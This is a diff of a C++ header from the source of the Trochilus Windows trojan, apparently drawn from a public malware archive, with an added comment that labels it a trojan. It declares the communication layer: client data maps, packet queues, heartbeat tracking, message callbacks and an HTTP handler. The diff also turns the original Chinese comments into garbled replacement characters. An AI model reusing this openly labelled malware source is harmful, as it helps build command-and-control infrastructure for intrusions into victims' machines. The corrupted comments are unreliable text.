@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 #include <list>
 #include <map>
@@ -45,7 +56,7 @@ public:
 	BOOL DeleteCommService(int serialid);
 
 private:
-	//ÏûÏ¢·¢ËÍºÍÓ¦´ðÊý¾Ý½á¹¹
+	//ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½Íºï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½Ý½á¹¹
 	typedef struct  
 	{
 		CommData	sendData;
@@ -55,11 +66,11 @@ private:
 	typedef std::map<MSGSERIALID, SEND_AND_REPLY> DataMap;
 	typedef std::map<tstring, DataMap> ClientDataMap;
 
-	//´ý·¢ËÍÏûÏ¢Êý¾Ý½á¹¹
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½Ý½á¹¹
 	typedef std::list<PCP_PACKET> ToSendPacketQueue;
 	typedef std::map<CPGUID, ToSendPacketQueue> ToSendPacketMap;
 
-	//ÐÄÌøÊý¾Ý½á¹¹
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý½á¹¹
 	typedef struct
 	{
 		__time64_t	time;
@@ -67,7 +78,7 @@ private:
 	} HEARTBEAT_INFO;
 	typedef std::map<tstring, HEARTBEAT_INFO> HeartbeatMap;
 
-	//ÏûÏ¢´¦Àí»Øµ÷Êý¾Ý½á¹¹
+	//ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½Øµï¿½ï¿½ï¿½ï¿½Ý½á¹¹
 	typedef struct  
 	{
 		FnMsgHandler	fnCallback;
@@ -86,10 +97,10 @@ private:
 
 	static BOOL MsgHandler_AvailableComm(MSGID msgid, const CommData& commData, LPVOID lpParameter);
 
-	//ÏûÏ¢´¦Àí»Øµ÷
+	//ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½Øµï¿½
 	void HandleMsgByMsgHandler(MSGID msgid, const CommData& commData);
 
-	//HTTPÏûÏ¢´¦Àí
+	//HTTPï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½
 	static int HttpMsgHandler(struct mg_connection *conn, enum mg_event ev);
 	static void HttpPollThread(LPVOID lpParameter);
 
